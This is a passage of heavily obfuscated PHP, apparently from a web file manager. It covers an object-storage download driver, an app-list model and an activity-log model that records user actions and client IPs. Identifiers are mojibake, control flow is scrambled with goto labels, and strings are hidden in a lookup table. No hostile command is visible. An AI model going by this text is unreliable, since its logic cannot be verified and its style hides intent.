$this->isFolder($aÌÁ¾±Íˆœ)) { return !1; } try { $CÄ¹‡Ã½í = $this->trafficLimit($C¼â¸ëšµ–[109], $CÄ¹‡Ã½í); $F¹¤ñ·©‹ = $this->client->signUrl($this->bucket, $this->pathEncode($aÌÁ¾±Íˆœ), 3600 * 12, $C¼â¸ëšµ–[227], $CÄ¹‡Ã½í); return $this->getCdnLink($F¹¤ñ·©‹); } catch (OSS\Core\OssException $CöÃ÷š¤Ş¾) { return !1; } } public function fileOut($DÑ§Åˆã , $dÅœà¨Å = false, $EáÅŠ—™‚ = false, $D¤ ğÃ… = '') { goto CˆÁÛÃí”«; fçšªèº¥: $EáÅŠ—™‚ = rawurlencode($EáÅŠ—™‚); $FÒ¾æ‹áÊÔ = get_file_mime(get_path_ext($EáÅŠ—™‚)); if ($FÒ¾æ‹áÊÔ == $FÚàìæ—ŠÔ[212]) { return parent::fileOut($DÑ§Åˆã , $dÅœà¨Å, $EáÅŠ—™‚, $D¤ ğÃ…); } goto d“–àÁøô; cÅ½‘–‹: $e¢¾ÅÎ½‚ê = $this->link($DÑ§Åˆã , $bÆÙÜœŒÌ÷); $this->fileOutLink($e¢¾ÅÎ½‚ê); goto dŒÅÏ¹¸ôÉ; CˆÁÛÃí”«: $FÚàìæ—ŠÔ =& $_SERVER[Šº]; if ($this->isFileOutServer()) { return $this->fileOutServer($DÑ§Åˆã , $dÅœà¨Å, $EáÅŠ—™‚, $D¤ ğÃ…); } if (!$EáÅŠ—™‚) { $EáÅŠ—™‚ = $this->pathThis($DÑ§Åˆã ); } goto fçšªèº¥; d“–àÁøô: $dÅœà¨Å = $dÅœà¨Å ? $FÚàìæ—ŠÔ[213] : $FÚàìæ—ŠÔ[214]; $bÆÙÜœŒÌ÷ = array(OSS\OssClient::OSS_SUB_RESOURCE => $FÚàìæ—ŠÔ[1286] . rawurlencode("{$dÅœà¨Å}\x3b\x66\x69\x6c\x65\x6e\141\x6d\x65\x3d{$EáÅŠ—™‚}")); $bÆÙÜœŒÌ÷[OSS\OssClient::OSS_SUB_RESOURCE] .= $FÚàìæ—ŠÔ[1287] . rawurlencode($FÒ¾æ‹áÊÔ); goto cÅ½‘–‹; dŒÅÏ¹¸ôÉ: } public function fileOutServer($Bé´Öƒ‹§É, $CĞ®œŒœÜ = false, $AŠÕÌèèÃ = false, $C„ñ˜ØØÁâ = '') { parent::fileOut($Bé´Öƒ‹§É, $CĞ®œŒœÜ, $AŠÕÌèèÃ, $C„ñ˜ØØÁâ); } public function fileOutImage($e‚Ã‹¬º¬¿, $BáÒÜ†Áê = 250) { $e™ö¥â·ù– = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Šº][1288] . $BáÒÜ†Áê); $bãÑĞª  = $this->link($e‚Ã‹¬º¬¿, $e™ö¥â·ù–); $this->fileOutLink($bãÑĞª ); } public function fileOutImageServer($F—İù…ä‹Æ, $CˆÙ é´µ = 250) { parent::fileOutImage($F—İù…ä‹Æ, $CˆÙ é´µ); } public function fileOutLink($D²îÎ‡ÅˆÃ) { $fÎÚÙÉØî =& $_SERVER[Šº]; if (!$this->isCdnHost() && substr($D²îÎ‡ÅˆÃ, 0, 7) == $fÎÚÙÉØî[1190]) { $D²îÎ‡ÅˆÃ = $fÎÚÙÉØî[1191] . substr($D²îÎ‡ÅˆÃ, 7); } header($fÎÚÙÉØî[159] . $D²îÎ‡ÅˆÃ); die; } public function hashMd5($D©È½Š÷™•, $dö¼ÛØÚÕÊ = '') { $cåÚ‘ô¡Ì =& $_SERVER[Šº]; $D‘Ï³Ç‡º = $this->_objectMeta($D©È½Š÷™•); if (!$D‘Ï³Ç‡º) { return $cåÚ‘ô¡Ì[33]; } if (!isset($D‘Ï³Ç‡º[$cåÚ‘ô¡Ì[1264]]) && !empty($dö¼ÛØÚÕÊ)) { $eˆ´å–ÍÅ = $this->updateObjMeta($D©È½Š÷™•, array($cåÚ‘ô¡Ì[1264] => $dö¼ÛØÚÕÊ)); $D‘Ï³Ç‡º[$cåÚ‘ô¡Ì[1264]] = $eˆ´å–ÍÅ ? $dö¼ÛØÚÕÊ : $cåÚ‘ô¡Ì[33]; } return isset($D‘Ï³Ç‡º[$cåÚ‘ô¡Ì[1264]]) ? strtolower($D‘Ï³Ç‡º[$cåÚ‘ô¡Ì[1264]]) : $cåÚ‘ô¡Ì[33]; } public function size($fÉÅƒàÌÎ‘) { $aÜ™Ğó»æ“ = $this->objectMeta($fÉÅƒàÌÎ‘); return $aÜ™Ğó»æ“ ? $aÜ™Ğó»æ“[$_SERVER[Šº][78]] : 0; } public function info($eãÏ¹Û‹Ç) { if ($this->isFolder($eãÏ¹Û‹Ç)) { return $this->folderInfo($eãÏ¹Û‹Ç); } else { if ($this->isFile($eãÏ¹Û‹Ç)) { return $this->fileInfo($eãÏ¹Û‹Ç); } } return !1; } public function exist($e™¨Ûö‚) { return $this->isFile($e™¨Ûö‚) || $this->isFolder($e™¨Ûö‚); } public function isFile($a‡î¢‚ˆ©Ü) { return !$this->isFolder($a‡î¢‚ˆ©Ü) && $this->objectMeta($a‡î¢‚ˆ©Ü); } public function isFolder($e˜ªìçèÈ‡) { return $this->cacheMethod($_SERVER[Šº][198], $e˜ªìçèÈ‡); } protected function objectMeta($aÌ½ƒñÑù) { return $this->cacheMethod($_SERVER[Šº][199], $aÌ½ƒñÑù); } protected function _objectMeta($B„õ÷ÜØ‡Ç) { $dì»ìÉØÚ =& $_SERVER[Šº]; try { $bµñË‹ŒƒĞ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($B„õ÷ÜØ‡Ç)); } catch (OSS\Core\OssException $EÖîô«îÁ) { $bµñË‹ŒƒĞ = !1; } if ($bµñË‹ŒƒĞ) { $bµñË‹ŒƒĞ[$dì»ìÉØÚ[78]] = intval($bµñË‹ŒƒĞ[$dì»ìÉØÚ[1262]]); } return $bµñË‹ŒƒĞ; } protected function _isFolder($f‡ë’œÜó‹) { $F›í£íÄØ =& $_SERVER[Šº]; if ($f‡ë’œÜó‹ == $F›í£íÄØ[33] || $f‡ë’œÜó‹ == $F›í£íÄØ[8]) { return !0; } $eÚ‘Šœ°¤ = array($F›í£íÄØ[1258] => $F›í£íÄØ[8], $F›í£íÄØ[1259] => rtrim($f‡ë’œÜó‹, $F›í£íÄØ[8]) . $F›í£íÄØ[8], $F›í£íÄØ[1260] => 1, $F›í£íÄØ[1261] => $F›í£íÄØ[33]); $dêÔÓ†çƒ´ = $this->client->listObjects($this->bucket, $eÚ‘Šœ°¤); if ($dêÔÓ†çƒ´->getObjectList() || $dêÔÓ†çƒ´->getPrefixList()) { return !0; } return !1; } } goto D˜÷¸ÎŒ‡Ô; cˆëìÍ ·Ù: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\x4c\x69\x67\150\164\x41\160\160"; public $modelType = "\x53\x79\163\x74\x65\x6d\117\160\x74\x69\157\x6e"; public $field = array("\156\x61\155\x65", "\x67\x72\x6f\x75\x70", "\x64\x65\163\x63", "\x63\157\x6e\x74\145\156\164"); public function listData($e“’ç¶Îë— = false, $aİÊÓ¶‹ = "\155\157\144\151\146\171\x54\x69\155\145", $E½ÜÄ³¹ ¹ = true) { return parent::listData($e“’ç¶Îë—, $aİÊÓ¶‹, $E½ÜÄ³¹ ¹); } public function remove($a½ã‚·ÌÇˆ) { $FÄÌñ°ºÛš = $this->findByName($a½ã‚·ÌÇˆ); if (!$FÄÌñ°ºÛš) { return !1; } return parent::remove($FÄÌñ°ºÛš[$_SERVER[Šº][392]]); } public function add($b¿¹ÁˆëÔ) { if ($this->findByName($b¿¹ÁˆëÔ[$_SERVER[Šº][28]])) { return !1; } return parent::insert($b¿¹ÁˆëÔ); } public function update($DÂåî¤¦à², $dÓ¡ä‡ÔœÇ) { $Bƒ”¯•Óƒò =& $_SERVER[Šº]; $b‡¤Åé¹¬ = $this->findByName($DÂåî¤¦à²); $E°í„ôõŸ‹ = $this->findByName($dÓ¡ä‡ÔœÇ[$Bƒ”¯•Óƒò[28]]); if (!$b‡¤Åé¹¬ || $E°í„ôõŸ‹ && $E°í„ôõŸ‹[$Bƒ”¯•Óƒò[392]] != $b‡¤Åé¹¬[$Bƒ”¯•Óƒò[392]]) { return !1; } return parent::update($b‡¤Åé¹¬[$Bƒ”¯•Óƒò[392]], $dÓ¡ä‡ÔœÇ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\155\137\154\157\147"; protected $dataAuto = array(array("\143\162\x65\141\164\145\124\x69\155\x65", "\164\x69\155\x65", "\151\156\x73\x65\162\x74", "\146\165\x6e\143\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $FÆ‹ê¾Ìß =& $_SERVER[Šº]; return array($FÆ‹ê¾Ìß[1990] => LNG($FÆ‹ê¾Ìß[1991]), $FÆ‹ê¾Ìß[1992] => LNG($FÆ‹ê¾Ìß[1993]), $FÆ‹ê¾Ìß[1617] => LNG($FÆ‹ê¾Ìß[1994]), $FÆ‹ê¾Ìß[1995] => LNG($FÆ‹ê¾Ìß[1996]), $FÆ‹ê¾Ìß[1997] => LNG($FÆ‹ê¾Ìß[1998]), $FÆ‹ê¾Ìß[1999] => LNG($FÆ‹ê¾Ìß[2000]), $FÆ‹ê¾Ìß[2001] => LNG($FÆ‹ê¾Ìß[2002]), $FÆ‹ê¾Ìß[1647] => LNG($FÆ‹ê¾Ìß[2002]), $FÆ‹ê¾Ìß[1648] => LNG($FÆ‹ê¾Ìß[2003]), $FÆ‹ê¾Ìß[2004] => LNG($FÆ‹ê¾Ìß[2005]), $FÆ‹ê¾Ìß[2006] => LNG($FÆ‹ê¾Ìß[2007]), $FÆ‹ê¾Ìß[2008] => LNG($FÆ‹ê¾Ìß[2009]), $FÆ‹ê¾Ìß[2010] => LNG($FÆ‹ê¾Ìß[2011]), $FÆ‹ê¾Ìß[1645] => LNG($FÆ‹ê¾Ìß[2012]), $FÆ‹ê¾Ìß[1652] => LNG($FÆ‹ê¾Ìß[2013]), $FÆ‹ê¾Ìß[2014] => LNG($FÆ‹ê¾Ìß[2015]), $FÆ‹ê¾Ìß[2016] => LNG($FÆ‹ê¾Ìß[2017]), $FÆ‹ê¾Ìß[2018] => LNG($FÆ‹ê¾Ìß[2019]), $FÆ‹ê¾Ìß[2020] => LNG($FÆ‹ê¾Ìß[2021]), $FÆ‹ê¾Ìß[1655] => LNG($FÆ‹ê¾Ìß[2022]), $FÆ‹ê¾Ìß[1656] => LNG($FÆ‹ê¾Ìß[2023]), $FÆ‹ê¾Ìß[2024] => LNG($FÆ‹ê¾Ìß[2025]), $FÆ‹ê¾Ìß[2026] => LNG($FÆ‹ê¾Ìß[2027]), $FÆ‹ê¾Ìß[2028] => LNG($FÆ‹ê¾Ìß[2029]), $FÆ‹ê¾Ìß[1650] => LNG($FÆ‹ê¾Ìß[2030]), $FÆ‹ê¾Ìß[2031] => LNG($FÆ‹ê¾Ìß[2032]), $FÆ‹ê¾Ìß[1649] => LNG($FÆ‹ê¾Ìß[2033]), $FÆ‹ê¾Ìß[2034] => LNG($FÆ‹ê¾Ìß[2035]), $FÆ‹ê¾Ìß[2036] => LNG($FÆ‹ê¾Ìß[2037]), $FÆ‹ê¾Ìß[2038] => LNG($FÆ‹ê¾Ìß[2039]), $FÆ‹ê¾Ìß[2040] => LNG($FÆ‹ê¾Ìß[2040]), $FÆ‹ê¾Ìß[2041] => LNG($FÆ‹ê¾Ìß[1621]), $FÆ‹ê¾Ìß[2042] => LNG($FÆ‹ê¾Ìß[2043]), $FÆ‹ê¾Ìß[2044] => LNG($FÆ‹ê¾Ìß[2045]), $FÆ‹ê¾Ìß[2046] => LNG($FÆ‹ê¾Ìß[2047]), $FÆ‹ê¾Ìß[2048] => LNG($FÆ‹ê¾Ìß[2049]), $FÆ‹ê¾Ìß[2050] => LNG($FÆ‹ê¾Ìß[2051]), $FÆ‹ê¾Ìß[2052] => LNG($FÆ‹ê¾Ìß[2052]), $FÆ‹ê¾Ìß[2053] => LNG($FÆ‹ê¾Ìß[2054]), $FÆ‹ê¾Ìß[2055] => LNG($FÆ‹ê¾Ìß[2056]), $FÆ‹ê¾Ìß[2057] => LNG($FÆ‹ê¾Ìß[2058]), $FÆ‹ê¾Ìß[2059] => LNG($FÆ‹ê¾Ìß[2060]), $FÆ‹ê¾Ìß[2061] => LNG($FÆ‹ê¾Ìß[2062]), $FÆ‹ê¾Ìß[2063] => LNG($FÆ‹ê¾Ìß[2064])); } private function typeFile() { $Fß›Ó³–¼ =& $_SERVER[Šº]; $A‰Ï»©ä“ë = array($Fß›Ó³–¼[1652] => array($Fß›Ó³–¼[1653]), $Fß›Ó³–¼[2008] => array($Fß›Ó³–¼[2065]), $Fß›Ó³–¼[2010] => array($Fß›Ó³–¼[2066]), $Fß›Ó³–¼[1645] => array($Fß›Ó³–¼[1646]), $Fß›Ó³–¼[2016] => array(), $Fß›Ó³–¼[2018] => array(), $Fß›Ó³–¼[2020] => array(), $Fß›Ó³–¼[1655] => array($Fß›Ó³–¼[1657]), $Fß›Ó³–¼[1656] => array($Fß›Ó³–¼[1657]), $Fß›Ó³–¼[2024] => array($Fß›Ó³–¼[2067]), $Fß›Ó³–¼[2026] => array($Fß›Ó³–¼[2067]), $Fß›Ó³–¼[2028] => array($Fß›Ó³–¼[2068]), $Fß›Ó³–¼[2014] => array($Fß›Ó³–¼[2069]), $Fß›Ó³–¼[1650] => array($Fß›Ó³–¼[2070]), $Fß›Ó³–¼[2031] => array($Fß›Ó³–¼[2071]), $Fß›Ó³–¼[1649] => array($Fß›Ó³–¼[1651])); return $A‰Ï»©ä“ë; } private function typeAll() { goto A½°©Üâ›ì; fËĞ¥¸ç¶: foreach ($cî¼öÁã‹ as $F—òŠØŒªŸ => $c¥²íÇÕ¦) { $aÓºš­ÆßÆ[$c¥²íÇÕ¦[0]] = $aÓºš­ÆßÆ[$F—òŠØŒªŸ]; } $aÓºš­ÆßÆ[$a“¿¶šÈ“à[1657]] = LNG($a“¿¶šÈ“à[2072]); $aÓºš­ÆßÆ[$a“¿¶šÈ“à[2067]] = LNG($a“¿¶šÈ“à[2073]); goto Cï»©“‘¬Ô; Cï»©“‘¬Ô: return $aÓºš­ÆßÆ; goto bâØ‰™™¾Ä; A½°©Üâ›ì: $a“¿¶šÈ“à =& $_SERVER[Šº]; $aÓºš­ÆßÆ = $this->typeList; $cî¼öÁã‹ = array_filter($this->typeFile()); goto fËĞ¥¸ç¶; bâØ‰™™¾Ä: } public function addLog($C™¾¶Ëš‰¢, $Ešè†ÜÍÚá = array()) { goto Dêœ»èµˆì; B‡†”—«¿ª: $Ešè†ÜÍÚá = array($Cä£å›È[1505] => Session::sign(), $Cä£å›È[1506] => $eÒ’ĞŞÓ¡§, $Cä£å›È[29] => $C™¾¶Ëš‰¢, $Cä£å›È[1508] => json_encode($Ešè†ÜÍÚá)); parent::add($Ešè†ÜÍÚá); goto a‘Î¿šù¸; B™´ñ­èĞğ: if (!$eÒ’ĞŞÓ¡§) { $eÒ’ĞŞÓ¡§ = (int) Session::get($Cä£å›È[1803]); } $fáÓÅƒ©î› = get_client_ip(); if (!$Ešè†ÜÍÚá || strlen(json_encode($Ešè†ÜÍÚá)) >= 1024) { $Ešè†ÜÍÚá = array($Cä£å›È[2074] => $fáÓÅƒ©î›); } else { if (is_array($Ešè†ÜÍÚá)) { $Ešè†ÜÍÚá[$Cä£å›È[2074]] = $fáÓÅƒ©î›; } else { $Ešè†ÜÍÚá = array($Cä£å›È[1076] => $Ešè†ÜÍÚá, $Cä£å›È[2074] => $fáÓÅƒ©î›); } } goto B‡†”—«¿ª; Dêœ»èµˆì: $Cä£å›È =& $_SERVER[Šº]; if (!isset($this->typeList[$C™¾¶Ëš‰¢])) { return; } $eÒ’ĞŞÓ¡§ = defined($Cä£å›È[461]) && USER_ID ? USER_ID : (isset($Ešè†ÜÍÚá[$Cä£å›È[1514]]) ? $Ešè†ÜÍÚá[$Cä£å›È[1514]] : 0); goto B™´ñ­èĞğ; a‘Î¿šù¸: } public function remove($c´ƒØ»¼¡³) { $this->where(array($_SERVER[Šº][419] => $c´ƒØ»¼¡³))->delete(); } private function _makeOrder($B³¹—„™­º = '') { goto C’š®‘Ëëã; EñÄÕ¦Ôø: return $this->order($B³¹—„™­º); goto Fù•Œ‚Î„; C’š®‘Ëëã: $Dƒê¢×ñ¤ =& $_SERVER[Šº]; $eî·Í÷Ó­ë = $Dƒê¢×ñ¤[193]; $Dïßİ—ËŸ  = array($Dƒê¢×ñ¤[435] => $Dƒê¢×ñ¤[436], $Dƒê¢×ñ¤[437] => $Dƒê¢×ñ¤[438]); goto BƒØà›¿¸â; BƒØà›¿¸â: $F¶±ÏÎª¼ = Input::get($Dƒê¢×ñ¤[443], $Dƒê¢×ñ¤[7], $Dƒê¢×ñ¤[1835], array($Dƒê¢×ñ¤[1759], $Dƒê¢×ñ¤[437])); $F¶±ÏÎª¼ = $Dïßİ—ËŸ [$F¶±ÏÎª¼]; $B³¹—„™­º = $B³¹—„™­º . "{$eî·Í÷Ó­ë}\x20{$F¶±ÏÎª¼}"; goto EñÄÕ¦Ôø; Fù•Œ‚Î„: } public function get($DŞÄ»¦Â¥Ï = '') { goto cŒ‚©ÅòŒğ; cŒ‚©ÅòŒğ: $aÇ¢æÓ¾‚ =& $_SERVER[Šº]; if (!$DŞÄ»¦Â¥Ï) { show_json(array()); } $C„ÆëŒ…¿ = array(); goto B¨óñ÷ñ„¸; bæòå÷‚ä¾: $bÁõ–¹çáª[$aÇ¢æÓ¾‚[366]] = $this->logList($bÁõ–¹çáª[$aÇ¢æÓ¾‚[366]]); return $bÁõ–¹çáª; goto bÚµ¾èøå; Aø¨Â¸îÕ×: if (!empty($DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[2074]])) { $C„ÆëŒ…¿[$aÇ¢æÓ¾‚[438]] = array($aÇ¢æÓ¾‚[379], "\x25{$DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[2074]]}\45"); } $bÁõ–¹çáª = $this->_makeOrder()->where($C„ÆëŒ…¿)->selectPage(); if (empty($bÁõ–¹çáª[$aÇ¢æÓ¾‚[366]])) { show_json(array(), !0, $bÁõ–¹çáª[$aÇ¢æÓ¾‚[363]]); } goto bæòå÷‚ä¾; B¨óñ÷ñ„¸: if ($DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[1514]]) { $C„ÆëŒ…¿[$aÇ¢æÓ¾‚[1514]] = $DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[1514]]; } if (isset($DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[719]])) { $bÖ³‚‘çñ§ = $DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[719]]; $Aêœ¼áì“– = isset($DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[483]]) ? $DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[483]] : time(); $C„ÆëŒ…¿[$aÇ¢æÓ¾‚[193]] = array($aÇ¢æÓ¾‚[330], array($bÖ³‚‘çñ§, $Aêœ¼áì“–)); } if ($DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[29]]) { $aãã»ë§ëÀ = explode($aÇ¢æÓ¾‚[47], $DŞÄ»¦Â¥Ï[$aÇ¢æÓ¾‚[29]]); $c›ÛÊêá…‘ = $this->typeFile(); $b íº°Œ£ò = array(); foreach ($aãã»ë§ëÀ as $bÄ¼Ê¡°°À) { $b íº°Œ£ò[] = $bÄ¼Ê¡°°À; if (isset($c›ÛÊêá…‘[$bÄ¼Ê¡°°À])) { $b íº°Œ£ò = array_merge($b íº°Œ£ò, $c›ÛÊêá…‘[$bÄ¼Ê¡°°À]); } } $b íº°Œ£ò = array_unique($b íº°Œ£ò); if ($b íº°Œ£ò) { $C„ÆëŒ…¿[$aÇ¢æÓ¾‚[29]] = array($aÇ¢æÓ¾‚[7], $b íº°Œ£ò); } } else { $C„ÆëŒ…¿[$aÇ¢æÓ¾‚[29]] = array($aÇ¢æÓ¾‚[2075], $aÇ¢æÓ¾‚[2076]); } goto Aø¨Â¸îÕ×; bÚµ¾èøå: } private function ipAddress(&$CÇº‘…ìÎ‰) { $f•¢“¡ìÜ¦ =& $_SERVER[Šº]; if (!empty($CÇº‘…ìÎ‰[$f•¢“¡ìÜ¦[2074]])) { $Dòä—“Û·  = IpLocation::get($CÇº‘…ìÎ‰[$f•¢“¡ìÜ¦[2074]]); } else { $Dòä—“Û·  = LNG($f•¢“¡ìÜ¦[2077]); } $CÇº‘…ìÎ‰[$f•¢“¡ìÜ¦[2078]] = $Dòä—“Û· ; } private function descZipDownload($CÙàÉØ‚Â¾, &$Bƒ’ÌÍ†ä•) { $eË…¶ØêÕÜ =& $_SERVER[Šº]; if (!isset($CÙàÉØ‚Â¾[$eË…¶ØêÕÜ[2079]])) { return; } $fíÀøÒêê = json_decode($CÙàÉØ‚Â¾[$eË…¶ØêÕÜ[2079]], !0); foreach ($fíÀøÒêê as $b¥Ëë¦›‘) { try { $DàÍ†ÇÌ = IO::infoFull($b¥Ëë¦›‘[$eË…¶ØêÕÜ[76]]); } catch (Exception $bÔ½ô¢­Õ®) { continue; } $CÙàÉØ‚Â¾[$eË…¶ØêÕÜ[76]] = $b¥Ëë¦›‘[$eË…¶ØêÕÜ[76]]; $Bƒ’ÌÍ†ä•[] = $CÙàÉØ‚Â¾[$eË…¶ØêÕÜ[403]] = $DàÍ†ÇÌ[$eË…¶ØêÕÜ[403]]; $Bƒ’ÌÍ†ä•[] = $CÙàÉØ‚Â¾[$eË…¶ØêÕÜ[1891]] = $DàÍ†ÇÌ[$eË…¶ØêÕÜ[485]]; break; } return $CÙàÉØ‚Â¾; } private function getSourceList(&$B¸‡Ü–Á„Û) { $eŒ¡ÏóÂŸ° =& $_SERVER[Šº]; $fÃ¹©Òò¤¯ = array(); foreach ($B¸‡Ü–Á„Û as $DÇö™¸é»ä => $E‰é‡§·‡) { goto B¤©ˆŒÔ»Œ; B¤©ˆŒÔ»Œ: $B™ÁÇÍèÓ = json_decode($E‰é‡§·‡[$eŒ¡ÏóÂŸ°[438]], !0); if ($E‰é‡§·‡[$eŒ¡ÏóÂŸ°[29]] == $eŒ¡ÏóÂŸ°[1648]) { $B™ÁÇÍèÓ = $this->descZipDownload($B™ÁÇÍèÓ, $fÃ¹©Òò¤¯); $B¸‡Ü–Á„Û[$DÇö™¸é»ä][$eŒ¡ÏóÂŸ°[438]] = json_encode($B™ÁÇÍèÓ); continue; } if (strpos($E‰é‡§·‡[$eŒ¡ÏóÂŸ°[29]], $eŒ¡ÏóÂŸ°[1892]) !== 0) { if (!isset($B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[76]]) || strpos($E‰é‡§·‡[$eŒ¡ÏóÂŸ°[29]], $eŒ¡ÏóÂŸ°[2080]) !== 0) { continue; } try { $DõÎºÒ¼„É = IO::infoFull($B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[76]]); } catch (Exception $D¸»ªÄ¡•õ) { continue; } $fÃ¹©Òò¤¯[] = $B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[403]] = $DõÎºÒ¼„É[$eŒ¡ÏóÂŸ°[403]]; $fÃ¹©Òò¤¯[] = $B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[1891]] = $DõÎºÒ¼„É[$eŒ¡ÏóÂŸ°[485]]; $B¸‡Ü–Á„Û[$DÇö™¸é»ä][$eŒ¡ÏóÂŸ°[438]] = json_encode($B™ÁÇÍèÓ); continue; } goto C†ÄÙ ¡à; C†ÄÙ ¡à: $fÃ¹©Òò¤¯[] = $B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[403]]; $fÃ¹©Òò¤¯[] = $B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[1891]]; if ($B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[29]] == $eŒ¡ÏóÂŸ°[528]) { $fÃ¹©Òò¤¯[] = $B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[438]][$eŒ¡ÏóÂŸ°[1043]]; $fÃ¹©Òò¤¯[] = $B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[438]][$eŒ¡ÏóÂŸ°[1044]]; } goto e¯ø‚©øùù; e¯ø‚©øùù: if ($B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[29]] == $eŒ¡ÏóÂŸ°[1899]) { $fÃ¹©Òò¤¯[] = $B™ÁÇÍèÓ[$eŒ¡ÏóÂŸ°[438]][$eŒ¡ÏóÂŸ°[403]]; } goto B½õ§…õ¥“; B½õ§…õ¥“: } if (!$fÃ¹©Òò¤¯) { return array(); } return Model($eŒ¡ÏóÂŸ°[788])->sourceListInfo($fÃ¹©Òò¤¯, !0); } private function logList($B¸´´°¼â) { goto F—ÄîÚ«ÙË; F—ÄîÚ«ÙË: $aøí’ÏäŠß =& $_SERVER[Šº]; $Cˆ³Ëˆö• = array_to_keyvalue($B¸´´°¼â, $aøí’ÏäŠß[33], $aøí’ÏäŠß[1514]); $E‰ìŞ„ÙŒª = Model($aøí’ÏäŠß[514])->userListInfo(array_unique($Cˆ³Ëˆö•)); goto b¼Å’ˆ¢‹Ç; b¼Å’ˆ¢‹Ç: $cÔöøÆ‰ç˜ = $this->getSourceList($B¸´´°¼â); $dŠ–»»Ì´ç = $this->typeAll(); $aŠó£†ØÃ÷ = array(); goto Dò†Ø¦ÎäŠ; Dò†Ø¦ÎäŠ: $D’¬¬ïÈ  = array(); foreach ($B¸´´°¼â as $b°×®ó×´ë => $dÊšŠ°òŠ‚) { goto a°ª÷ù‚¢ò; a†”‰Û: $dÊšŠ°òŠ‚[$aøí’ÏäŠß[28]] = isset($f†•Âõˆ˜[$aøí’ÏäŠß[28]]) ? $f†•Âõˆ˜[$aøí’ÏäŠß[28]] : LNG($aøí’ÏäŠß[2077]); $dÊšŠ°òŠ‚[$aøí’ÏäŠß[1941]] = isset($f†•Âõˆ˜[$aøí’ÏäŠß[1941]]) ? $f†•Âõˆ˜[$aøí’ÏäŠß[1941]] : $aøí’ÏäŠß[33]; $dÊšŠ°òŠ‚[$aøí’ÏäŠß[1420]] = isset($dŠ–»»Ì´ç[$d‚õ¢´Ï†½]) ? $dŠ–»»Ì´ç[$d‚õ¢´Ï†½] : $Bè…ôË‚Ü; goto E¹”Şè¾£˜; D§˜¢ƒÜ: $this->ipAddress($dÊšŠ°òŠ‚); if (strpos($d‚õ¢´Ï†½, $aøí’ÏäŠß[1892]) === 0 || isset($Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[1891]])) { goto aÍ¡ìŠ³; dä—¬–ŞÁŞ: if ($Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[1904]] && $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[1904]][$aøí’ÏäŠß[411]] == $aøí’ÏäŠß[1157]) { $D’¬¬ïÈ [] = $dÊšŠ°òŠ‚[$aøí’ÏäŠß[392]]; unset($B¸´´°¼â[$b°×®ó×´ë]); continue; } goto c¿±ïÅ¤ÍÚ; aÍ¡ìŠ³: $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[85]] = $cÔöøÆ‰ç˜[$Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[403]]]; $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[1904]] = $cÔöøÆ‰ç˜[$Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[1891]]]; if ($Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[29]] == $aøí’ÏäŠß[528]) { $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[438]][$aøí’ÏäŠß[1043]] = $cÔöøÆ‰ç˜[$Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[438]][$aøí’ÏäŠß[1043]]]; $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[438]][$aøí’ÏäŠß[1044]] = $cÔöøÆ‰ç˜[$Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[438]][$aøí’ÏäŠß[1044]]]; } goto d¼®ÉÅß¨; d¼®ÉÅß¨: if ($Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[29]] == $aøí’ÏäŠß[1899]) { $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[438]][$aøí’ÏäŠß[403]] = $cÔöøÆ‰ç˜[$Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[438]][$aøí’ÏäŠß[403]]]; } if ($Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[29]] == $aøí’ÏäŠß[1643]) { $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[1904]] = $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[85]]; $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[1891]] = $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[1904]][$aøí’ÏäŠß[403]]; $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[85]] = !1; $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[403]] = $aøí’ÏäŠß[33]; } if ($Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[85]] && $Câ¿ÇÏÂæÎ[$aøí’ÏäŠß[85]][$aøí’ÏäŠß[411]] == $aøí’ÏäŠß[1157]) { $D’¬¬ïÈ [] = $dÊšŠ°òŠ‚[$aøí’ÏäŠß[392]]; unset($B¸´´°¼â[$b°×®ó×´ë]); continue; } goto dä—¬–ŞÁŞ; c¿±ïÅ¤ÍÚ: } $dÊšŠ°òŠ‚[$aøí’ÏäŠß[438]] = $Câ¿ÇÏÂæÎ; goto F©•ƒ…à; 